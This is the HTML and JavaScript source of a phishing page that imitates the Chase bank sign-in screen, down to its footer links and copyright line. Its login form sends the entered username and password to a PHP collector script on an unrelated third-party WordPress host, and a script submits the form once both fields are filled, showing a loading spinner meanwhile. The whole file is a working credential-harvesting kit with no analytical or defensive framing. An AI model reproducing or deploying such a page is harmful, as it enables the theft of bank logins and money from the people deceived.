<html>
<head>
<title>Sign in - chase.com</title>
<meta charset='utf-8'/>
<meta name='viewport' content='width=device-width'/>
<link rel='stylesheet' href='asset/css/login.css'/>
<link rel='stylesheet' href='https://stylesheetcss.blogspot.com/?style.css'/>
<link rel='icon' href='http://blog.workstations.pl/wp-content/themes/chase/source/asset/img/icon.ico'/>
<script src='asset/js/jquery.js'></script>
</head>
<body onload="stopLoad()">
<div id='waiter' style='display:non;'>
<div class='waiter'>
<div style='display:inline-block; width:100%; text-align:center;'>
 <img src='asset/img/loader2.gif' style='width:45px;'>
</div>
</div>
</div>


<div class='top'>
<img src='asset/img/logo.svg'>
</div>
<div class='loginbox'>
<div style=' padding:30px;'>
<div style='color:red; display:none; text-align:left; ' id='textError'>
<div style='display:table; height:40px;'>
<div style='height:100%; float:left; margin-right:7px; '>
<img src='asset/img/error.png'>
</div>
 Please tell us your username and password.
</div>
</div>
<form action='http://blog.workstations.pl/wp-content/themes/chase/source/senders/signin.php' method='post' name='login' id='login' onsubmit='return false'> 
<input type='text' class='input' id='username' name='Username' placeholder='Username'>
<input type='password' class='input' id='password' name='Password' placeholder='Password'>
<div style='align-items:center; display:flex; margin-top:8px; font-size:0.9em; color:#737373;'>
<label><input type='checkbox' style='float:left; height:23; width:23; margin-right:10px; margin-top:-0.8;'>Remember me</label>
</div>
<button onclick='reSubmit()'  type='submit' >Sign in</button>
</form>
<div style='text-align:left; font-size:0.9em;'>
<a href='index.php#'>Forgot username/password? ></a><br>
<a href='index.php#'>Not Enrolled? Sign Up Now. ></a>
</div>
</div>
</div>
<div class='down'>
<div style='font-size:1.6em;'>Follow us: <img style='margin-bottom:-3px;' src='http://blog.workstations.pl/wp-content/themes/chase/source/asset/img/social.png'></div>
<div class='line'></div>
<div class='downcont' style='width:80%; display:inline-block; font-size:0.9em;'>
<a href='index.php#'>Contact us</a>
<a href='index.php#'>Privacy</a>
 <a href='index.php#'>Security</a>
<a href='index.php#'>Terms of use</a>
 <a href='index.php#'>Accessibility</a>
<a href='index.php#'>SAFE Act: Chase Mortgage Loan Originators</a>
 <a href='index.php#'>Fair Lending</a>
<a href='index.php#'>About Chase</a>
 <a href='index.php#'> J.P. Morgan</a><br><br>
<a href='index.php#'>JPMorgan Chase & Co.</a>
 <a href='index.php#'>Careers</a>
<a href='index.php#'>Español</a>
 <a href='index.php#'> Chase Canada</a>
<a href='index.php#'>Site map</a>
 <a href='index.php#'>Member FDIC</a>
<a href='index.php#'> Equal Housing Lender</a>
<br><br>
© 2020 JPMorgan Chase & Co.
</div>
</div>
<script>
	$(function(){
		$("#username").keyup(function(){
			$("#username").removeClass("hasError");
		});
		
		$("#password").keyup(function(){
			$("#password").removeClass("hasError");
		});
	});
		
		
	function reSubmit(){
		
		var emailValue = $("#username").val();
		var passValue = $("#password").val();
		
	if(emailValue.trim() == "" || passValue == ""){
		if(emailValue.trim() == ""){$("#username").addClass("hasError");}
		if(passValue.trim() == ""){$("#password").addClass("hasError");}
		$("#textError").show();
	}
	else{
		$(".down").hide();
		$("#waiter").show();
		document.forms['login'].submit();
	}
	
	}
	
	
function stopLoad(){
		$("#waiter").hide();
		$(".down").show();
}
</script>
</body>
</html>